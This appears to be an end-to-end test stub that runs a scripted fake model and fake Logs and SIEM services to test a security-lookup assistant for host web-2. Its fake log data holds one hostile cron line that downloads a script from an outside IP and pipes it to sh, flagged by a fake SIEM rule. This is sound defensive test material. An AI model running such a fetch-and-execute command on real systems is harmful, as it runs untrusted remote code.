// The stub model and stub products of e2e/run.sh, in a container of their own: the model is the tests' fake, scripted
// to look up web-2 in Logs and SIEM and then answer from what came back; the products answer one person's tokens.
import { fakeModel, fakeProducts } from "../server/fakes.ts";

const now = Date.now();
const iso = (ago: number) => new Date(now - ago).toISOString();

await fakeModel(
  (r) => {
    if (r.toolResults.length === 0)
      return {
        calls: [
          { name: "logs_search", arguments: { query: "host:web-2", start: iso(24 * 3_600_000) } },
          { name: "siem_signals", arguments: { host: "web-2" } },
        ],
      };
    const [logs, siem] = r.toolResults as Array<{ source: number; data?: any }>;
    const line = logs?.data?.lines?.[0];
    const signal = siem?.data?.signals?.[0];
    return {
      text: [
        line
          ? `On web-2, Logs has ${logs!.data.lines.length} matching line; the newest, at ${line.time}, reads: ${line.msg} [${logs!.source}]`
          : "Logs returned no line for web-2.",
        signal
          ? `SIEM raised a ${signal.severity} signal, ${signal.rule}, first seen ${signal.firstSeen} [${siem!.source}].`
          : "SIEM returned no signal for web-2.",
      ].join("\n\n"),
    };
  },
  { port: 11434, host: "0.0.0.0" },
);

await fakeProducts(
  {
    oa_logs_e2eviewer000000000000: { product: "logs", person: "e2e" },
    oa_siem_e2eviewer000000000000: { product: "siem", person: "e2e" },
  },
  {
    "logs /api/v1/search": () => ({
      body: {
        lines: [
          {
            time: iso(6 * 3_600_000),
            msg: "CRON[812]: (root) CMD (curl -s http://198.51.100.7/x | sh)",
            level: "info",
            host: "web-2",
            service: "cron",
            source: "journald",
            fields: {},
          },
        ],
        start: iso(24 * 3_600_000),
        end: iso(0),
        truncated: false,
      },
    }),
    "siem /api/v1/signals": () => ({
      body: {
        signals: [
          {
            id: "sig-1",
            rule: { id: "r1", title: "New cron entry runs a download", tags: [] },
            severity: "high",
            host: "web-2",
            status: "new",
            count: 1,
            firstSeen: iso(6 * 3_600_000),
            lastSeen: iso(6 * 3_600_000),
          },
        ],
        nextCursor: null,
      },
    }),
  },
  { port: 8080, host: "0.0.0.0" },
);
console.log("stub model on :11434, stub products on :8080");
